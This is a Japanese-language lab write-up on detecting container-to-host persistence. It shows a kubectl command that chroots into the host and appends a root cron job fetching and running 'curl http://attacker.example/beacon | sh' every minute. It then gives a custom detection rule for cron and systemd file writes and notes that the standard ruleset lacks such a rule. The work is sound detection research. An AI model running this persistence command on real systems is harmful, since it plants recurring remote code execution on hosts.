## Lab 12: ホスト到達後の初動（永続化）

- MITRE ATT&CK for Containers: T1543, T1053
- 前提: Lab 10で得たホストアクセスから、永続化のためホスト側のcronを書き換える

### 手順

```bash
kubectl -n lab exec misconfigured-pod -- sh -c \
  "chroot /host sh -c 'echo \"* * * * * root curl http://attacker.example/beacon | sh\" >> /etc/cron.d/system-check'"
```

### 結果：攻撃は成立

`/etc/cron.d/system-check`へのファイル追記が成功。

### 重要な実証結果：「Scheduled Task Creation on Host」ルールは実在しない

Lab 10と同じパターンで、標準ルールセットには**cron/スケジュールタスクの書き換えを検知するルールが存在しなかった**。`grep -i cron`でヒットしたのは`cron_binaries`という**除外リスト**（cron自身がシェルを起動しても警告しないようにするための例外リスト）のみで、**検知対象としてのcronルールは無い**。

### カスタムルールでの検知（実機確認済み）

```yaml
- rule: Scheduled Task File Modified
  condition: >
    open_write and container
    and (fd.name startswith /etc/cron.d or fd.name startswith /etc/cron.daily
         or fd.name startswith /etc/cron.hourly or fd.name=/etc/crontab
         or fd.name startswith /etc/systemd/system)
```

```
11:48:31.554119443: Critical Scheduled task file modified (file=/etc/cron.d/system-check2
  command=sh -c echo "* * * * * root curl ..." >> /etc/cron.d/system-check2
  container=app pod=misconfigured-pod ns=lab)
```

Lab 10の教訓（chroot後は`/host`プレフィックスが付かない）を踏まえ、最初から正しいパス形式で実装できた。

### 考察（本文修正用）

- 「ホストへの永続化は一般的なホストセキュリティの検知ロジックがそのまま有効」という本文の結論は、**標準ルールセットには該当ロジックが実在しない**ため不正確。正しくは「**カスタムルールを書けば検知できるが、標準ルールセットにはcron/systemd永続化を見るルールが用意されていない**」という、Lab 10・Lab 12に共通する"持続的脅威への備えの手薄さ"という論点としてまとめ直す。
